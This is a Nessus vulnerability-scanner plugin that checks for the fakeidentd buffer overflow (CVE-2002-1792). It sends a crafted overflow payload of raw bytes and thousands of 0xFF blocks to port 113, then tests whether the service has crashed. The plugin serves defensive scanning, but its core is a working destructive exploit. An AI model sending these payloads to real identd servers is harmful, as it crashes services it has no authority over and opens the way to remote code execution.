#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# It's largely based on lameident3-exp.c by
# sloth@nopninjas.com - http://www.nopninjas.com
#
# This problem was originally found by Jedi/Sector One (j@pureftpd.org)
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and additional information reference link
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11054);
 script_cve_id("CVE-2002-1792");
 script_bugtraq_id(5351);

 script_version ("$Revision: 1.8 $");
 
 name["english"] = "fakeidentd overflow";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
fakeidentd is a minimal identd server that always replies to
requests with a fixed username.

There is a buffer overflow in some versions of this program
that allow an attacker to execute arbitrary code on this server.

Solution : Disable this service if you do not use it, or upgrade.
See http://software.freshmeat.net/projects/fakeidentd/

Additional Info : http://online.securityfocus.com/archive/1/284953

Risk factor : High";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "crashes the remote identd";
 summary["francais"] = "plantes le identd distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/auth", 113);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/auth");
if(!port) port = 113;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
 send(socket:soc, data:string(crap(32), "\r\n"));
 r = recv(socket:soc, length:4096);
 close(soc);
 if(!r)exit(0);
}
else exit(0);


soc = open_sock_tcp(port);
if(soc)
{

 #
 # Due to the nature of the bug, we can't just send crap and hope
 # the remote service will crash....
 #
 # 
 send(socket:soc, data:crap(19));
 deux = raw_string(0x41, 0xEB, 0xEF, 0xFA, 0xB7);
 send(socket:soc, data:deux);
 data = crap(data:raw_string(0xFF), length:19);
 for(i=0;i<6000;i=i+1)
 { 
  send(socket:soc, data:data);
 }

 close(soc);
 
 
 soc2 = open_sock_tcp(port);
 if ( ! soc2 ) exit(0);
 send(socket:soc2, data:crap(19));
 deux = raw_string(0x41, 0x5B, 0xFF, 0xFF, 0xFF);
 send(socket:soc2, data:deux);
 trois = raw_string(0xFF, 0xFF, 0xFF, 0xFF);
 send(socket:soc2, data:trois);
 
 close(soc2);
 
 soc2 = open_sock_tcp(port);
 if ( ! soc2 ) exit(0);
 send(socket:soc2, data:string("1234, 1234\n"));
 r = recv(socket:soc2, length:4096);
 close(soc2);
 
 soc3 = open_sock_tcp(port);
 if(!soc3)security_hole(port);
 
}
